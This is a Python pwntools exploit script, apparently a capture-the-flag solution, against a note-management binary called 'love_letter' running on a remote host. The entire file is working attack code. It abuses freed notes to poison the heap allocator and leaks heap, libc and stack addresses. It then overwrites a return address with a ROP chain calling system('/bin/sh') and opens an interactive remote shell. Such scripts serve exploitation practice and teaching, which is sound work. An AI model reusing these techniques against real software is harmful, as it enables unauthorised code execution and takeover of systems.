from pwn import *

context.binary = binary = ELF('./love_letter', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

def create_note(data, author, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'1')
	p.sendlineafter(b'> ', author)
	p.sendlineafter(b'> ', data)
	if protected:
		p.sendlineafter(b'> ', b'y')
		p.sendlineafter(b'> ', password)
	else:
		p.sendlineafter(b'> ', b'n')

def change_note(idx, author, data, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'2')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)
	p.sendlineafter(b'Author: ', author)
	p.sendlineafter(b'Content: ', data)

def print_note(idx, data=True, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'3')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)
	if data:
		p.recvuntil(b'Note: ')
		return p.recvuntil(b'-')[:-1]
	else:
		p.recvuntil(b'Author: ')
		return p.recvuntil(b'N')[:-1]

def delete_note(idx, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'4')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)

def save_notes():
	p.sendlineafter(b'Choice: ', b'5')
	p.sendlineafter(b'> ', b'AAAA')

#p = process()
p = remote('83.136.250.179',56605)

create_note(b'AAAA', b'BBBB', protected=True, password=b'pwned')
delete_note(1, protected=True, password=b'pwned')
create_note(b'CCCC', b'DDDD')
create_note(b'EEEE', b'FFFF', protected=True, password=b'pwned')
delete_note(1)

heap_base = u64(print_note(1, data=False, protected=True, password=b'pwned').ljust(8, b'\x00')) << 12
info(f'heap base @ {hex(heap_base)}')

create_note(b'AAAA', b'BBBB')
create_note(b'AAAA', b'BBBB', protected=True, password=b'pwned')
delete_note(3, protected=True, password=b'pwned')
create_note(b'CCCC', b'DDDD')
create_note(b'EEEE', b'FFFF')
delete_note(3)

change_note(1, p64(heap_base >> 12 ^ (heap_base+0x2a0))[:-2], b'aaaa', protected=True, password=b'pwned')
create_note(b'AAAA', b'BBBB', protected=True, password=p64(heap_base+0x438)[:-2])
change_note(2, p64(heap_base+0x820)[:-2], b'AAAA')
save_notes()

libc_leak = u64(print_note(1, data=True, protected=True, password=b'pwned').ljust(8, b'\x00'))
libc.address = libc_leak - 0x219ce0
info(f'libc @ {hex(libc.address)}')

change_note(2, p64(libc.symbols.environ)[:-2], b'AAAA')
environ = u64(print_note(1, data=True, protected=True, password=b'pwned').ljust(8, b'\x00'))
info(f'environ @ {hex(environ)}')

r = ROP(libc)
rc = p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

change_note(2, p64(environ-0x140)[:-2], b'AAAA')
change_note(1, b'aaaa', rc, protected=True, password=b'pwned')

p.interactive()
